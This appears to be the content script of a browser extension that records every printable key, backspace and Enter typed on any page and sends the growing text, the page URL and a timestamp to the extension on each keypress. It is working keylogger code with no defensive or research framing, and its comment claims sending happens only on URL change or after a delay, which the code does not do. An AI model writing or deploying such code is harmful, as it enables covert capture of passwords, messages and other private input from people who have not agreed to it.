let typedText = "";
let currentUrl = window.location.href;

document.addEventListener("keydown", (event) => {
    if (event.key.length === 1) { // Capture only printable characters
        typedText += event.key;
    } else if (event.key === "Backspace") {
        typedText += "<back>";
    } else if (event.key === "Enter") {
        typedText += "\n";
    }

    // Send data only when the URL changes or after a short delay
    chrome.runtime.sendMessage({
        type: "keystroke",
        url: currentUrl,
        text: typedText,
        timestamp: new Date().toISOString(),
    });
});
